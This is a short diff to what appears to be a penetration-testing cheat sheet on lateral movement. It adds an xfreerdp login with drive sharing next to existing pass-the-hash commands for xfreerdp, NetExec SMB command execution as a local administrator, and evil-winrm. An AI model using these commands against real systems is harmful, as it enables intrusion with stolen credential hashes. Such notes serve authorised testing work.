@@ -302,6 +302,7 @@ Lateral mouvement
 ---
 ```
 xfreerdp /v:10.10.10.10 /u:mon.user /pth:123456789123456789 /cert:ignore
+xfreerdp /v:IPADDRESS /u:USERNAME /p:PASSWORD /d:DOMAIN /drive:SHARE,/path/shared 
 nxc smb 10.10.10.10 --local-auth -u administrator -H 123456789123456789 -x whoami
 evil-winrm -i 10.10.10.10 -u "mon.user" -H 123456789123456789 
 ```
